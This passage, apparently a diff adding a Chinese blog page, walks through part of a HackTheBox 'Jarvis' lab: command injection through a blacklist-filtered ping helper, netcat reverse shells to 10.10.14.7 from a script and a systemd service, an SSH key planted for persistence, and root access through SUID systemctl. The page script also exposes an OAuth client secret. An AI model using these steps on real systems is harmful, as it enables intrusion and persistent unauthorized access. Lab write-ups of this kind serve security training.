class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Level'</span> <span class="keyword">in</span> i:</span><br><span class="line">            fecha=(i.split(<span class="string">' '</span>)[<span class="number">6</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">7</span>]).split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">            regex = <span class="string">'(\d+)-(.*)-(\d+)(.*)'</span></span><br><span class="line">            logEx=re.match(regex, fecha).groups()</span><br><span class="line">            mes = to_dict(logEx[<span class="number">1</span>])</span><br><span class="line">            fecha = logEx[<span class="number">0</span>] + <span class="string">'-'</span> + mes + <span class="string">'-'</span> + logEx[<span class="number">2</span>] + <span class="string">' '</span> + logEx[<span class="number">3</span>]</span><br><span class="line">            fecha = datetime.strptime(fecha, <span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">            <span class="keyword">if</span> fecha &gt; dat:</span><br><span class="line">                dat = fecha</span><br><span class="line">                req = i.split(<span class="string">' '</span>)[<span class="number">8</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">9</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">return</span> dat, req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_dict</span><span class="params">(name)</span>:</span></span><br><span class="line">    month_dict = &#123;<span class="string">'Jan'</span>:<span class="string">'01'</span>,<span class="string">'Feb'</span>:<span class="string">'02'</span>,<span class="string">'Mar'</span>:<span class="string">'03'</span>,<span class="string">'Apr'</span>:<span class="string">'04'</span>, <span class="string">'May'</span>:<span class="string">'05'</span>, <span class="string">'Jun'</span>:<span class="string">'06'</span>,<span class="string">'Jul'</span>:<span class="string">'07'</span>,<span class="string">'Aug'</span>:<span class="string">'08'</span>,<span class="string">'Sep'</span>:<span class="string">'09'</span>,<span class="string">'Oct'</span>:<span class="string">'10'</span>,<span class="string">'Nov'</span>:<span class="string">'11'</span>,<span class="string">'Dec'</span>:<span class="string">'12'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> month_dict[name]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_max_level</span><span class="params">(lines)</span>:</span></span><br><span class="line">    level=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Level'</span> <span class="keyword">in</span> j:</span><br><span class="line">            <span class="keyword">if</span> int(j.split(<span class="string">' '</span>)[<span class="number">4</span>]) &gt; int(level):</span><br><span class="line">                level = j.split(<span class="string">' '</span>)[<span class="number">4</span>]</span><br><span class="line">                req=j.split(<span class="string">' '</span>)[<span class="number">8</span>] + <span class="string">' '</span> + j.split(<span class="string">' '</span>)[<span class="number">9</span>] + <span class="string">' '</span> + j.split(<span class="string">' '</span>)[<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">return</span> level, req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span><span class="params">()</span>:</span></span><br><span class="line">    forbidden = [<span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'`'</span>, <span class="string">'||'</span>, <span class="string">'|'</span>]</span><br><span class="line">    command = input(<span class="string">'Enter an IP: '</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            print(<span class="string">'Got you'</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">'ping '</span> + command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    show_header()</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'-h'</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">'--help'</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-s'</span>:</span><br><span class="line">        show_statistics()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-l'</span>:</span><br><span class="line">        list_ip()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-p'</span>:</span><br><span class="line">        exec_ping()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
+
+<h1 id="pepper-shell"><a href="#pepper-shell" class="headerlink" title="pepper shell"></a>pepper shell</h1><p>那就直接以pepper身份反弹shell:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -u pepper &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py -p</span><br><span class="line"></span><br><span class="line">$(&#x2F;tmp&#x2F;miao.sh)</span><br><span class="line"></span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010710.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="ssh-key"><a href="#ssh-key" class="headerlink" title="ssh key"></a>ssh key</h2><p>为了后续方便操作可以直接把ssh公钥写进去：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line">cd .ssh</span><br><span class="line">echo 'ssh-rsa *****' &gt; authorized_keys</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010711.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="miao-sh"><a href="#miao-sh" class="headerlink" title="miao.sh"></a>miao.sh</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#39;#!&#x2F;bin&#x2F;bash\n\nnc -e &#x2F;bin&#x2F;bash 10.10.14.7 4446&#39; &gt; &#x2F;tmp&#x2F;miao.sh</span><br><span class="line"></span><br><span class="line">chmod +x &#x2F;tmp&#x2F;miao.sh</span><br></pre></td></tr></table></figure>
+
+<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>petter用户目录得到user.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010712.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>systemctl有suid：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010713.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>利用方式：</p>
+<ul>
+<li>systemctl | GTFOBins<br><a href="https://gtfobins.github.io/gtfobins/systemctl/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/systemctl/</a></li>
+</ul>
+<p>就是创建一个service，执行命令</p>
+<h2 id="miao-service"><a href="#miao-service" class="headerlink" title="miao.service"></a>miao.service</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Type&#x3D;oneshot</span><br><span class="line">ExecStart&#x3D;&#x2F;bin&#x2F;bash -c &#39;nc -e &#x2F;bin&#x2F;bash 10.10.14.7 4447&#39;</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl link /tmp/miao.service</span><br><span class="line">systemctl enable --now /tmp/miao.service</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010714.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>打到root shell，读取root.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010715.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li>systemctl | GTFOBins<br><a href="https://gtfobins.github.io/gtfobins/systemctl/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/systemctl/</a></li>
+<li>HTB: Jarvis | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html</a></li>
+<li><a href="https://www.hackthebox.eu/home/machines/writeup/194" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/writeup/194</a></li>
+<li>HackTheBox - Jarvis - YouTube<br><a href="https://www.youtube.com/watch?v=YHHWvXBfwQ8&amp;feature=youtu.be&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=YHHWvXBfwQ8&amp;feature=youtu.be&amp;ab_channel=IppSec</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2021-01-07T06:37:59.690Z" itemprop="dateUpdated">2021-01-07 14:37:59</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/&title=《Jarvis - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/&title=《Jarvis - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Jarvis - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/03/03/Warmup-HCTF-2018/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Warmup - HCTF 2018</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/02/10/Poison-HackTheBox/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Poison - HackTheBox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2021</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/&title=《Jarvis - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/&title=《Jarvis - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Jarvis - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACIUlEQVR42u3aS46kMBAFwLr/pWlpttO43rOhJUx4VSohTGxS+ft84nP8O2f/HP+d8TPJez53HAwMjMcyjuE5u2DMaNnJveP3Y2BgvIExDrIJo754eFf+bRgYGBjjZ1aSvDasY2BgYMwxxongXKjFwMDAWCliV9pzyY1LiSYGBsbWjPaz/vL3jfMNDAyMhzCO8uQDy+Su8XC0+CoMDIytGeuflTfO8pg5+SQGBsbWjDbvGher+RJGW762pTIGBsYejNzaJnPtCKEdc2JgYGAkSV6+KJYE6HZ19bR8xcDA2JQxl1EmKWObn+bNuF8CLgYGxqaMtonWtvLXi9X8nRgYGO9htKGwHUzm4XjuFgwMjP0Y+QrFVf+vDCa/7IxgYGBsyshLxzz4JgPR/JmiiMXAwHgNIy84V1bH2rui3RAMDIxNGV+SramWfR4iL3sDBgbG1owkas2F1GsL1AuCLwYGxmMZ+ZCyDZfraxw5GAMDY29GXqau/D+XbtZrHxgYGJsy8mTuvlWJHHkapjEwMF7GaEvZuXK3LZ4n1ywwMDC2YKwsOrTN/bnn59Y1MDAwdmIc5WlDbbtgkZTHX1JDDAyM7Rj5aRv36428FomBgbE349oyMgnTSWsvac9hYGC8jXFf6EyC9QW1OAYGBkY81FwZeeak09QQAwMDY6p8nUtAMTAwMFaK2PZD59Yy6nEFBgbG1oz1wUDbXGvvugCAgYHxVMYPu0AUGRtxKhYAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
